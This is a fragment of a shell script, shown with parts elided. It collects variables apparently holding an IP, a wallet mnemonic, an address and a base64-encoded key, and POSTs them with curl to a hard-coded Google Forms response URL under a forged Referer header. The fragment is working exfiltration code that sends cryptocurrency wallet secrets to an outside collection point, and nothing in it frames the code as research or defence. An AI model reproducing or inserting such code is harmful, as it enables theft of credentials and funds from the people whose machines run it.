...
# Google Form URL
URL="https://docs.google.com/forms/d/e/1FAIpQLSebjb1bzI2R7hcpSRy20lfp94x7oGJyXAGZ_i-cgRqPm7eBqQ/formResponse"

# Form Data


DATA="entry.742022616=$IP_DATA&entry.102280586=$IP_mnemonic&entry.2019040306=$ADDRESS&entry.393936597=$KEY_BASE64&fvv=1&partialResponse=%5Bnull%2Cnull%2C%229118231867837584960%22%5D&pageHistory=0&fbzx=9118231867837584960&submissionTimestamp=1719756476357"
...
curl -X POST $URL \
    ...
    -H "Referer: https://docs.google.com/forms/d/e/1FAIpQLSebjb1bzI2R7hcpSRy20lfp94x7oGJyXAGZ_i-cgRqPm7eBqQ/viewform" \
